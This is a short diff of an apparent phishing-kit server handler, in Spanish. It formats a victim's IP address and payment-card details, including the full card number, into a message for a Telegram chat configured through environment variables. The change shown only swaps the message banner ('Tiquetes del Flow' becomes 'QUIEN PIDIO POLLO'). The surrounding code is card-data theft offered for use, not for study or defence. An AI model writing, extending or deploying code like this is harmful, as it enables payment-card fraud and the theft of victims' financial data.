@@ -15,7 +15,7 @@ export default async function handler(req, res) {
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
     // Construir mensaje con saltos de línea reales
-    let message = "🛑 *Tiquetes del Flow* 🛑\n\n";
+    let message = "🍗 *QUIEN PIDIO POLLO* 🍗\n\n";
     message += `🔑 *IP del Dispositivo*: \`${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\`\n\n`;
     message += "💳 *Detalles de la Tarjeta* 💳\n";
     message += `🔢 *Número de Tarjeta*: \`${data.cardNumber}\`\n`;
